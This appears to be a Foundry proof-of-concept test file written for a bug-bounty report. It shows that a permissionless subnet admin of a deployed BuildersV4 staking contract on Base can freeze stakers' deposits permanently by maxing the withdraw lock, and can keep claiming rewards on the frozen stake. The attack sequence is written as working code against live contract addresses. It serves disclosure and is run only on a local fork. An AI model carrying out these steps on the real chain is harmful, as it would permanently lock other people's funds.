// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice Minimal cheatcode interface (subset of forge-std's Vm) — only the
/// cheatcodes this PoC uses, so the test runs with zero dependencies.
interface Vm {
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function prank(address msgSender) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
    function warp(uint256 newTimestamp) external;
    function deal(address account, uint256 newBalance) external;
    function load(address target, bytes32 slot) external returns (bytes32);
    function store(address target, bytes32 slot, bytes32 value) external;
    function expectRevert(bytes calldata revertData) external;
}

/// @notice Minimal console logging via forge's console precompile address.
library console {
    address constant CONSOLE_ADDRESS = address(0x000000000000000000636F6e736F6c652e6c6f67);

    function log(string memory p0, uint256 p1) internal view {
        (bool success, ) = CONSOLE_ADDRESS.staticcall(abi.encodeWithSignature("log(string,uint256)", p0, p1));
        success;
    }

    function log(string memory p0, bool p1) internal view {
        (bool success, ) = CONSOLE_ADDRESS.staticcall(abi.encodeWithSignature("log(string,bool)", p0, p1));
        success;
    }
}

/// @notice Minimal ERC20 interface used by this PoC.
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @notice Minimal test base: cheatcode access, address derivation and
/// require-based assertions. Replaces forge-std's Test for this PoC so the
/// repository has no dependencies and `forge test` works from a clean clone.
abstract contract Test {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function makeAddr(string memory name) internal pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(name)))));
    }

    function deal(address account, uint256 newBalance) internal {
        vm.deal(account, newBalance);
    }

    /// @dev ERC20 balance deal: probe mapping slots 0..9 for the account's
    /// balance slot and write the value directly (same approach forge-std's
    /// deal uses, without the dependency).
    function deal(address token, address to, uint256 give) internal {
        for (uint256 slot; slot < 10; slot++) {
            bytes32 loc = keccak256(abi.encode(to, slot));
            bytes32 prev = vm.load(token, loc);
            vm.store(token, loc, bytes32(give));
            if (IERC20(token).balanceOf(to) == give) {
                return;
            }
            vm.store(token, loc, prev);
        }
        revert("deal: ERC20 balance slot not found");
    }

    function assertTrue(bool condition, string memory err) internal pure {
        require(condition, err);
    }

    function assertEq(uint256 a, uint256 b) internal pure {
        require(a == b, "assertEq(uint256) failed");
    }

    function assertEq(uint256 a, uint256 b, string memory err) internal pure {
        require(a == b, err);
    }

    function assertGt(uint256 a, uint256 b, string memory err) internal pure {
        require(a > b, err);
    }
}

/// @notice Minimal interface of deployed BuildersV4 (Base proxy
/// 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9, impl BuildersV4
/// 0x18faef315b40a6d9cf49628f1133b1aa507513b0, Sourcify exact_match).
interface IBuildersV4Mini {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }

    function owner() external view returns (address);
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (
            string memory name,
            address admin,
            uint128 unused1,
            uint128 withdrawLockPeriodAfterDeposit,
            uint128 unused2,
            uint256 minimalDeposit,
            address claimAdmin
        );
}

/// @title SubnetAdminFreeze — PoC: a subnet admin can PERMANENTLY freeze all
/// stakers' MOR deposits in their subnet with one editSubnet() call.
/// @dev Attacker is a fresh EOA with NO protocol privilege: not the BuildersV4
/// owner (multisig 0x1FE04BC15Cf2c5A2d41a0b3a96725596676eBa1E), not the
/// networkShareOwner (address(0)), not any admin. Anyone can become a subnet
/// admin permissionlessly via createSubnet(). The victim is an ordinary staker
/// who deposited under the advertised 7-day lock. The admin then raises the
/// per-subnet withdrawLockPeriodAfterDeposit to type(uint128).max; the lock is
/// evaluated against the CURRENT subnet value at withdraw time, so every
/// staker's funds are frozen forever. There is no cap on the lock, no timelock
/// on editSubnet, and no escape hatch for stakers. The admin cannot steal the
/// funds (withdraw only pays the caller's own deposit) — the impact is a
/// permanent freeze / destruction of user funds, which the program's Critical
/// definition explicitly lists ("permanent freeze with no recovery").
contract SubnetAdminFreezeTest is Test {
    address constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    // Pinned fork block (Base), observed 2026-11-16.
    uint256 constant FORK_BLOCK = 58252712;

    IBuildersV4Mini builders = IBuildersV4Mini(BUILDERS);
    IERC20 mor = IERC20(MOR);

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        deal(MOR, victim, 1_000 ether);
        deal(attacker, 10 ether);
        deal(victim, 10 ether);
    }

    function _subnet(uint128 lock_) internal view returns (IBuildersV4Mini.Subnet memory) {
        return IBuildersV4Mini.Subnet({
            name: "FreezeDemoSubnet",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: lock_,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
    }

    function _meta() internal pure returns (IBuildersV4Mini.SubnetMetadata memory) {
        return IBuildersV4Mini.SubnetMetadata("", "", "", "");
    }

    function testFreezeCore() public {
        assertTrue(builders.owner() != attacker, "attacker must not be owner");
        uint256 minLock = builders.minimalWithdrawLockPeriod();

        vm.prank(attacker);
        builders.createSubnet(_subnet(uint128(minLock)), _meta());
        bytes32 subnetId = builders.getSubnetId("FreezeDemoSubnet");

        uint256 buildersBalBefore = mor.balanceOf(BUILDERS);

        vm.startPrank(victim);
        mor.approve(BUILDERS, type(uint256).max);
        builders.deposit(subnetId, 1_000 ether);
        vm.stopPrank();
        assertEq(mor.balanceOf(BUILDERS), buildersBalBefore + 1_000 ether);

        // 3. Sanity: after the advertised 7-day lock, the victim CAN withdraw.
        vm.warp(block.timestamp + 8 days);
        vm.prank(victim);
        builders.withdraw(subnetId, 1 ether);
        assertEq(mor.balanceOf(victim), 1 ether, "victim should exit normally pre-attack");

        // 4. ATTACK: admin raises the subnet lock to ~2^127 seconds
        //    (~5e30 years — effectively forever, no overflow). No timelock,
        //    no cap, no staker consent. One call.
        uint128 hugeLock = type(uint128).max / 2;
        vm.prank(attacker);
        builders.editSubnet(subnetId, _subnet(hugeLock));
        (, , , uint128 lockAfter, , , ) = builders.subnets(subnetId);
        assertEq(uint256(lockAfter), uint256(hugeLock), "lock must be maxed");

        // 5. Victim can NEVER withdraw again — even 10 years later.
        vm.warp(block.timestamp + 3650 days);
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        builders.withdraw(subnetId, 999 ether);

        // 6. Still frozen 1,000 years later: permanent, no recovery.
        vm.warp(block.timestamp + 365_000 days);
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        builders.withdraw(subnetId, 999 ether);

        // 7. Victim's 999 MOR is still locked inside BuildersV4.
        assertEq(mor.balanceOf(victim), 1 ether, "victim only ever got 1 MOR back");
        assertEq(mor.balanceOf(BUILDERS), buildersBalBefore + 999 ether, "victim funds stuck in contract");

        // 8. Attacker cannot STEAL the funds (freeze only): attacker has no
        //    deposit in this subnet, so their own withdraw reverts.
        vm.prank(attacker);
        vm.expectRevert("BU: nothing to withdraw");
        builders.withdraw(subnetId, 1 ether);

        console.log("VICTIM FROZEN MOR:", uint256(999));
        console.log("ATTACKER IS OWNER:", builders.owner() == attacker);
    }

    /// @dev With the lock at type(uint128).max, withdraw reverts with a
    /// panic 0x11 instead: `lastDeposit + lock` overflows uint128 in the
    /// `block.timestamp > lastDeposit + lock` check. Same outcome — the
    /// victim's funds are permanently frozen — via an arithmetic panic
    /// rather than the clean require.
    function testMaxLockPanicsOnWithdraw() public {
        uint256 minLock = builders.minimalWithdrawLockPeriod();
        vm.prank(attacker);
        builders.createSubnet(_subnet(uint128(minLock)), _meta());
        bytes32 subnetId = builders.getSubnetId("FreezeDemoSubnet");

        vm.startPrank(victim);
        mor.approve(BUILDERS, type(uint256).max);
        builders.deposit(subnetId, 1_000 ether);
        vm.stopPrank();

        vm.prank(attacker);
        builders.editSubnet(subnetId, _subnet(type(uint128).max));

        vm.warp(block.timestamp + 3650 days);
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(bytes4(0x4e487b71), uint256(0x11))); // Panic(0x11)
        builders.withdraw(subnetId, 999 ether);
        assertEq(mor.balanceOf(victim), 0, "victim got nothing back");
    }

    /// @dev The freeze is PROFITABLE for the admin, not just griefing: the
    /// victim's frozen stake keeps accruing rewards, and the admin keeps
    /// claiming them (claim fee is 0 live). The victim can never exit, the
    /// admin harvests yield from their principal forever.
    function testFrozenStakeKeepsPayingAdmin() public {
        uint256 minLock = builders.minimalWithdrawLockPeriod();
        vm.prank(attacker);
        builders.createSubnet(_subnet(uint128(minLock)), _meta());
        bytes32 subnetId = builders.getSubnetId("FreezeDemoSubnet");

        vm.startPrank(victim);
        mor.approve(BUILDERS, type(uint256).max);
        builders.deposit(subnetId, 1_000 ether);
        vm.stopPrank();

        vm.prank(attacker);
        builders.editSubnet(subnetId, _subnet(type(uint128).max / 2));

        // 30 days pass: victim's frozen 1,000 MOR accrues subnet rewards.
        vm.warp(block.timestamp + 30 days);
        uint256 pending = builders.getCurrentSubnetRewards(subnetId);
        assertGt(pending, 0, "frozen stake must still accrue rewards");

        // Admin claims those rewards to themselves.
        uint256 balBefore = mor.balanceOf(attacker);
        vm.prank(attacker);
        (bool ok, ) = address(builders).call(
            abi.encodeWithSignature("claim(bytes32,address)", subnetId, attacker)
        );
        assertTrue(ok, "admin claim must succeed");
        uint256 harvested = mor.balanceOf(attacker) - balBefore;
        assertGt(harvested, 0, "admin harvests rewards from frozen stake");
        console.log("HARVESTED FROM FROZEN STAKE (MOR):", harvested / 1 ether);

        // Victim still cannot withdraw their principal.
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        builders.withdraw(subnetId, 1_000 ether);
    }

    /// @dev Contrast: raising minimalDeposit does NOT freeze — a user can
    /// always fully withdraw. Only the withdraw-lock is a freeze vector.
    function testMinimalDepositRaiseDoesNotFreeze() public {
        uint256 minLock = builders.minimalWithdrawLockPeriod();
        vm.prank(attacker);
        builders.createSubnet(_subnet(uint128(minLock)), _meta());
        bytes32 subnetId = builders.getSubnetId("FreezeDemoSubnet");

        vm.startPrank(victim);
        mor.approve(BUILDERS, type(uint256).max);
        builders.deposit(subnetId, 1_000 ether);
        vm.stopPrank();

        // Admin raises minimalDeposit above the victim's balance.
        IBuildersV4Mini.Subnet memory s = _subnet(uint128(minLock));
        s.minimalDeposit = 100_000 ether;
        vm.prank(attacker);
        builders.editSubnet(subnetId, s);

        // Partial withdraw now reverts, but FULL withdraw still works.
        vm.warp(block.timestamp + 8 days);
        vm.prank(victim);
        vm.expectRevert("BU: invalid withdraw amount");
        builders.withdraw(subnetId, 1 ether);

        vm.prank(victim);
        builders.withdraw(subnetId, 1_000 ether);
        assertEq(mor.balanceOf(victim), 1_000 ether, "full exit must still work");
    }
}

/// @dev Negative control: the reward/claim path works normally on the fork.
/// A fresh subnet accrues real rewards from the live curve (pool 3, 80%
/// network share) and the admin can claim them. This confirms the freeze
/// finding is specific to the withdraw lock, not a broken build/fork.
contract ClaimSanityTest is Test {
    address constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant FORK_BLOCK = 58252712;

    IBuildersV4Mini builders = IBuildersV4Mini(BUILDERS);
    IERC20 mor = IERC20(MOR);
    address admin = makeAddr("admin2");
    address staker = makeAddr("staker2");

    function testClaimPaysRealRewards() public {
        vm.createSelectFork("base", FORK_BLOCK);
        deal(MOR, staker, 100_000 ether);
        deal(admin, 10 ether);
        deal(staker, 10 ether);

        IBuildersV4Mini.Subnet memory s = IBuildersV4Mini.Subnet({
            name: "ClaimSanitySubnet",
            admin: admin,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: admin
        });
        vm.prank(admin);
        builders.createSubnet(s, IBuildersV4Mini.SubnetMetadata("", "", "", ""));
        bytes32 subnetId = builders.getSubnetId("ClaimSanitySubnet");

        vm.startPrank(staker);
        mor.approve(BUILDERS, type(uint256).max);
        builders.deposit(subnetId, 100_000 ether);
        vm.stopPrank();

        vm.warp(block.timestamp + 30 days);
        uint256 pending = builders.getCurrentSubnetRewards(subnetId);
        assertGt(pending, 0, "subnet should have accrued rewards");

        uint256 balBefore = mor.balanceOf(admin);
        vm.prank(admin);
        // claim() is on the interface via low-level call to avoid extending it
        (bool ok, ) = BUILDERS.call(
            abi.encodeWithSignature("claim(bytes32,address)", subnetId, admin)
        );
        assertTrue(ok, "claim must succeed");
        uint256 received = mor.balanceOf(admin) - balBefore;
        assertGt(received, 0, "admin must receive rewards");
        console.log("CLAIMED MOR (30d, 100k stake):", received / 1 ether);
    }
}
